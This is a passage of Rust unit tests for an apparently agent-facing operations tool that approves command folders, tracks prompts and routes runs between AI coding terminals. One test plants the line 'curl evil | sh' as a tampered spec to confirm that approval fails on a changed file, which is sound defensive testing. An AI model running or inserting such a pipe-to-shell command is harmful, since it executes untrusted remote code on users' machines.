        assert!(host.has_ops("00000000000000ab", &project));
        assert!(!host.has_ops("00000000000000ac", &project));
    }

    #[test]
    fn discovery_reads_the_persons_prompts() {
        let dir = tempfile::tempdir().unwrap();
        let host = host(dir.path());
        let store = host.store("00000000000000ab");
        let hour = 60 * 60 * 1000;
        for (ago, text) in [(2 * hour, "deploy"), (hour, "deploy"), (0, "run the tests")] {
            store
                .record_prompt(&connecto_ops::PromptRecord {
                    at_ms: now_ms() - ago,
                    terminal: "claude-1".into(),
                    text: text.into(),
                    outcome: connecto_ops::PromptOutcome::None,
                })
                .unwrap();
        }
        let asked = host.asked("00000000000000ab");
        assert_eq!(asked.len(), 3);
        let digest = connecto_ops::discovery::digest(&asked, now_ms());
        assert!(digest.contains("2× · today · deploy"), "{digest}");
    }

    #[test]
    fn only_the_files_shown_are_approved() {
        let dir = tempfile::tempdir().unwrap();
        let project = dir.path().join("p");
        write(&project, "tests", SPEC, "cargo test\n");
        let host = host(dir.path());
        let shown = folder::load(&project, "tests").unwrap().hash;
        write(&project, "tests", SPEC, "curl evil | sh\n");
        assert!(
            host.approve("00000000000000ab", &project, "tests", &shown)
                .is_err()
        );
        assert!(host.state("00000000000000ab").approved.is_empty());
        let now = folder::load(&project, "tests").unwrap().hash;
        host.approve("00000000000000ab", &project, "tests", &now)
            .unwrap();
        assert_eq!(host.state("00000000000000ab").approved["tests"], now);
    }

    #[test]
    fn a_run_reports_only_from_its_own_terminal() {
        let dir = tempfile::tempdir().unwrap();
        let project = dir.path().join("p");
        write(&project, "tests", SPEC, "cargo test\n");
        let host = host(dir.path());
        approve(&host, &project, "tests");
        let agent = caller(&project, ToolKind::Claude);
        let OpsAnswer::Exec(exec) = host.command(&agent, "run", &["tests".into()], None) else {
            panic!("no exec");
        };
        let mut other = caller(&project, ToolKind::Claude);
        other.terminal = "claude-9".into();
        let args = [exec.run.clone(), "exit 0".into(), "1".into()];
        assert!(matches!(
            host.command(&other, "done", &args, None),
            OpsAnswer::Refused { .. }
        ));
        assert_eq!(
            host.command(&agent, "done", &args, None),
            OpsAnswer::Text(String::new())
        );
    }

    #[test]
    fn a_matching_prompt_is_suggested_and_every_prompt_is_kept() {
        let dir = tempfile::tempdir().unwrap();
        let project = dir.path().join("p");
        write(&project, "tests", SPEC, "cargo test\n");
        write(&project, "deploy", DEPLOY, "echo deploy\n");
        let host = host(dir.path());
        approve(&host, &project, "tests");
        let agent = caller(&project, ToolKind::Codex);
        let PromptAdvice::Suggest(line) = host.on_prompt(&agent, "please run the tests") else {
            panic!("not suggested");
        };
        assert!(
            line.starts_with("[connecto]") && line.contains("`tests`"),
            "{line}"
        );
        // Not approved: never suggested.
        assert_eq!(host.on_prompt(&agent, "deploy"), PromptAdvice::Nothing);
        assert_eq!(
            host.on_prompt(&agent, "why is it slow?"),
            PromptAdvice::Nothing
        );
        // Another agent's message is not the person's: not kept.
        assert_eq!(
            host.on_prompt(
                &agent,
                "[connecto from claude-2, request r1.] run the tests"
            ),
            PromptAdvice::Nothing
        );
        let kept = host.store("00000000000000ab").prompts();
        assert_eq!(kept.len(), 3);
        assert_eq!(
            kept[0].outcome,
            connecto_ops::PromptOutcome::Suggested("tests".into())
        );
        // Hook off: kept, never suggested.
        host.update("00000000000000ab", |s| {
            s.hook = HookMode::Off;
            Ok(())
        })
        .unwrap();
        assert_eq!(
            host.on_prompt(&agent, "run the tests"),
            PromptAdvice::Nothing
        );
        assert_eq!(host.store("00000000000000ab").prompts().len(), 4);
    }

    #[test]
    fn llm_checks_its_arguments() {
        let dir = tempfile::tempdir().unwrap();
        let host = host(dir.path());
        let agent = caller(dir.path(), ToolKind::Shell);
        for args in [
            vec!["--model".to_owned(), "opus".to_owned()],
            vec!["x".to_owned()],
        ] {
            let answer = host.command(&agent, "llm", &args, Some("hi"));
            assert!(matches!(answer, OpsAnswer::Refused { ref code, .. } if code == "bad_request"));
        }
        let answer = host.command(&agent, "llm", &[], Some("  "));
        assert!(matches!(answer, OpsAnswer::Refused { .. }));
    }
}
